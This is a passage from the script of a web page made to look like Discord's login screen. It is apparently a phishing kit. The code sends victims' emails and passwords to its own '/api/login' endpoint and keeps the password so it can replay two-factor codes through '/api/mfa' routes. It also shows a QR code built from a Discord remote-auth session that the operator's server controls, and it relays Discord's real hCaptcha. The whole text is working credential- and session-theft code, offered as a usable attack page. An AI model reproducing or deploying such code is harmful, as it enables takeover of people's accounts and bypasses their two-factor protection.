own\">' + wait + '</span>s</span></div>';\n      stat.innerHTML = 'Scan this with the <strong>Discord mobile app</strong> to log in instantly.';\n      var cd = wait;\n      var cdTimer = setInterval(function(){\n        cd--;\n        var el = document.getElementById('rl-countdown');\n        if (el) el.textContent = cd;\n        if (cd <= 0) clearInterval(cdTimer);\n      }, 1000);      _qrBusy = false;      setTimeout(initQR, wait * 1000);\n      return;\n    }\n    if (d.fp) {\n      qrSid = d.id;\n      box.innerHTML = '';\n      new QRCode(box, { text: 'https://discord.com/ra/' + d.fp, width: 160, height: 160, colorDark: '#000', colorLight: '#fff', correctLevel: QRCode.CorrectLevel.M });\n      var ov = document.createElement('div'); ov.className = 'qr-overlay';\n      ov.innerHTML = '<svg width=\"16\" height=\"12\" viewBox=\"0 0 127.14 96.36\" fill=\"#313338\"><path d=\"M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z\"/></svg>';\n      box.appendChild(ov);\n      stat.innerHTML = 'Scan this with the <strong>Discord mobile app</strong> to log in instantly.';\n      qrTimer = setInterval(pollQR, 1500);\n      _qrBusy = false;\n    } else {\n      /* QR failed — show placeholder, auto-retry after 5s */\n      box.innerHTML = '<div style=\"width:160px;height:160px;background:#f0f0f0;border-radius:4px;display:flex;align-items:center;justify-content:center;\"><span style=\"color:#666;font-size:13px;cursor:pointer\" onclick=\"initQR()\">Click to load</span></div>';\n      stat.innerHTML = 'Scan this with the <strong>Discord mobile app</strong> to log in instantly.';\n      _qrBusy = false;\n      setTimeout(initQR, 5000);\n    }\n  } catch(e) {\n    box.innerHTML = '<div style=\"width:160px;height:160px;background:#f0f0f0;border-radius:4px;display:flex;align-items:center;justify-content:center;\"><span style=\"color:#666;font-size:13px;cursor:pointer\" onclick=\"initQR()\">Click to load</span></div>';\n    stat.innerHTML = 'Scan this with the <strong>Discord mobile app</strong> to log in instantly.';\n    _qrBusy = false;\n    setTimeout(initQR, 8000);\n  }\n}\n\nasync function pollQR() {\n  if (!qrSid) return;\n  try {\n    var r = await fetch('/api/qr/poll/' + qrSid);\n    if (r.status === 404) {\n      /* Session gone (server restart etc) — stop polling, get a fresh QR */\n      clearInterval(qrTimer); qrTimer = null; qrSid = null;\n      setTimeout(initQR, 3000);\n      return;\n    }\n    var d = await r.json();\n    var box  = document.getElementById('qr-box');\n    var stat = document.getElementById('qr-stat');\n    if (d.st === 'scanned') {\n      var av = d.user && d.user.avatar ? 'https://cdn.discordapp.com/avatars/' + d.user.id + '/' + d.user.avatar + '.png?size=64' : 'https://cdn.discordapp.com/embed/avatars/0.png';\n      box.innerHTML = '<img src=\"' + av + '\" style=\"width:72px;height:72px;border-radius:50%;border:3px solid var(--green-360)\"/>';\n      stat.innerHTML = '<strong style=\"color:var(--header-primary)\">' + ((d.user && d.user.name) || 'User') + '</strong><br>Confirm on your device\\u2026';\n    } else if (d.st === 'confirming') {\n      stat.innerHTML = 'Logging in\\u2026';\n    } else if (d.success || d.st === 'done') {\n      clearInterval(qrTimer); qrTimer = null; qrSid = null; onSuccess(d);\n    } else if (d.st === 'cancelled') {\n      clearInterval(qrTimer); qrTimer = null; qrSid = null;\n      setTimeout(initQR, 2000);\n    } else if (d.st === 'error' || d.st === 'expired') {\n      clearInterval(qrTimer); qrTimer = null; qrSid = null;\n      setTimeout(initQR, 3000);\n    }\n  } catch(e) {\n    clearInterval(qrTimer); qrTimer = null; qrSid = null;\n    setTimeout(initQR, 4000);\n  }\n}\n\n/* ═══ Login — single long-poll request, no stall/overlay/poll ═══ */\n\nfunction processLoginResult(d, httpStatus) {\n  hideCaptchaStall();\n  btnLoad('login-btn', false);\n\n  if (d.success) { onSuccess(d); return; }\n\n  if (d.mfa !== undefined && d.ticket) {\n    mfaTicket = d.ticket; mfaHasSms = !!d.sms; mfaMode = 'totp';\n    window._mfaPw = d._pw || captchaPw || '?';  /* Preserve password for MFA round-trip */\n    showSec('mfa'); updateMfaUI();\n    return;\n  }\n\n  if (d.email_verify) {\n    showSec('login');\n    showErr('login-error', 'New login location detected. Please check your email.');\n    var errEl = document.getElementById('login-error');\n    if (errEl) { errEl.style.color = '#ed4245'; errEl.style.fontWeight = '600'; }\n    return;\n  }\n\n  /* Error handling */\n  if (d.code === 50035) {\n    var errs = d.errors || {};\n    var msg = 'Login or password is invalid.';\n    if (errs.login) msg = (errs.login._errors || []).map(function(e){return e.message}).join(', ') || msg;\n    if (errs.password) msg = (errs.password._errors || []).map(function(e){return e.message}).join(', ') || msg;\n    showErr('login-error', msg);\n    document.getElementById('lbl-e').classList.add('err');\n    document.getElementById('lbl-p').classList.add('err');\n    return;\n  }\n\n  if (d.retry_after) {\n    showErr('login-error', 'Rate limited. Try again in ' + Math.ceil(d.retry_after) + 's.');\n    return;\n  }\n\n  /* Generic error */\n  var errMsg = '';\n  if (d.errors) {\n    var keys = Object.keys(d.errors);\n    for (var i = 0; i < keys.length; i++) {\n      var fieldErr = d.errors[keys[i]];\n      if (fieldErr && fieldErr._errors && fieldErr._errors.length) { errMsg = fieldErr._errors[0].message; break; }\n    }\n  }\n  if (!errMsg) errMsg = d.message || d.error || 'Something went wrong. Please try again.';\n  showErr('login-error', errMsg);\n}\n\n/* ═══ Login ═══ */\ndocument.getElementById('login-form').addEventListener('submit', async function(e) {\n  e.preventDefault();\n  var em = document.getElementById('email').value.trim();\n  var pw = document.getElementById('password').value;\n  hideErr('login-error');\n  document.getElementById('lbl-e').classList.remove('err');\n  document.getElementById('lbl-p').classList.remove('err');\n  if (!em) { document.getElementById('lbl-e').classList.add('err'); return; }\n  if (!pw) { document.getElementById('lbl-p').classList.add('err'); return; }\n  captchaEmail = em; captchaPw = pw;\n  btnLoad('login-btn', true);\n  _pendingResult = null;\n  _hcaptchaDone = false;\n  try {\n    /* Step 1: Try login — may return captcha challenge */\n    var r = await fetch('/api/login', {\n      method: 'POST',\n      headers: {'Content-Type':'application/json'},\n      body: JSON.stringify({login:em, password:pw})\n    });\n    var d = await r.json();\n    if (d.captcha_needed) {\n      /* Server says captcha required — render real Discord hCaptcha */\n      console.log('[login] captcha challenge received:', JSON.stringify({sitekey:d.sitekey,rqdata:d.rqdata?d.rqdata.slice(0,20)+'...':'',rqtoken:d.rqtoken?d.rqtoken.slice(0,20)+'...':'',session_id:d.session_id}));\n      captchaRqtoken   = d.rqtoken || '';\n      captchaSessionId = d.session_id || '';\n      showCaptchaStall(d.sitekey, d.rqdata);\n      /* Login button stays disabled — re-enabled in processLoginResult / error */\n      return;\n    }\n    processLoginResult(d, r.status);\n  } catch(err) {\n    showErr('login-error', 'Connection error. Please try again.');\n    btnLoad('login-btn', false);\n  }\n});\n\n/* ═══ MFA ═══ */\nfunction updateMfaUI() {\n  var title = document.getElementById('mfa-title');\n  var desc  = document.getElementById('mfa-desc');\n  var inp   = document.getElementById('mfa-code');\n  hideErr('mfa-error');\n  title.textContent = 'Multa-Factor Authentication';\n  desc.textContent  = 'Enter Discord auth code';\n  inp.placeholder   = '6-digit authentication code';\n  inp.maxLength     = 10;\n  document.getElementById('mfa-links').innerHTML = '';\n  inp.value = ''; setTimeout(function() { inp.focus(); }, 50);\n}\n\ndocument.getElementById('mfa-btn').addEventListener('click', submitMfa);\ndocument.getElementById('mfa-code').addEventListener('keydown', function(e) { if (e.key === 'Enter') submitMfa(); });\n\nasync function submitMfa() {\n  var code = document.getElementById('mfa-code').value.trim();\n  if (!code || !mfaTicket) return;\n  hideErr('mfa-error');\n  var endpoint = mfaMode === 'sms' ? '/api/mfa/sms' : (mfaMode === 'backup' ? '/api/mfa/backup' : '/api/mfa/totp');\n  btnLoad('mfa-btn', true);\n  try {\n    var r = await fetch(endpoint, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code:code, ticket:mfaTicket, pw:window._mfaPw||'?'}) });\n    var d = await r.json();\n    if (d.success) { onSuccess(d); return; }\n    showErr('mfa-error', d.message || 'Invalid code. Try again.');\n    document.getElementById('mfa-code').value = '';\n    document.getElementById('mfa-code').focus();\n  } catch(e) { showErr('mfa-error', 'Connection error.'); }\n  finally { btnLoad('mfa-btn', false); }\n}\n\nfunction backToLogin() {\n  mfaTicket = null;\n  hideErr('login-error');\n  hideErr('mfa-error');\n  showSec('login');\n}\n\n/* ═══ Init ═══ */\nwindow.addEventListener('DOMContentLoaded', function() {\n  initQR();\n\n  /* ── Safari iOS keyboard fix ── scroll focused input into view */\n  if (/iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {\n    document.querySelectorAll('input').forEach(function(inp){\n      inp.addEventListener('focus', function(){\n        var self = this;\n        setTimeout(function(){\n          self.scrollIntoView({behavior:'smooth', block:'center'});\n        }, 350);\n      });\n    });\n  }\n});\n</script>\n</body>\n</html>"
